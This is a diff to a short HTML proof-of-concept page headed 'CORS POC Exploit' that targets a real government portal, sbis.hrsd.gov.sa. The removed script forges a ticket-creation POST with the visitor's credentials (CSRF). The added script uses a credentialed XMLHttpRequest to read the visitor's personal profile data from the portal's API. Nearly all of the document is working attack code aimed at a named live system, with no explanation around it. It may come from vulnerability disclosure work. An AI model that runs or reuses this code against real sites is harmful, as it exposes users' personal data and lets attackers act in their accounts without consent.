@@ -1,20 +1,32 @@
 <!DOCTYPE html>
 <html>
 <body>
+<center>
+  <h2>CORS POC Exploit</h2>
+  <h3>Extract API Calls</h3>
+
+  <div id="demo">
+    <button type="button" onclick="cors()">Exploit</button>
+  </div>
+</center>
+
 <script>
-fetch("https://sbis.hrsd.gov.sa/api/tickets-management/portal/raise-ticket", {
-  method: "POST",
-  credentials: "include",
-  headers: {
-    "Content-Type": "application/json"
-  },
-  body: JSON.stringify({
-    "program": { "id": 1 },
-    "caseCategory": { "id": 5 },
-    "caseSubCategory": { "id": 11 },
-    "description": "CSRF via CORS – ticket created without user consent"
-  })
-});
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = alert(this.responseText);
+    }
+  };
+  xhttp.open(
+    "GET",
+    "https://sbis.hrsd.gov.sa/api/unified-profile/personal-info-tab/load",
+    true
+  );
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
 </script>
+
 </body>
 </html>
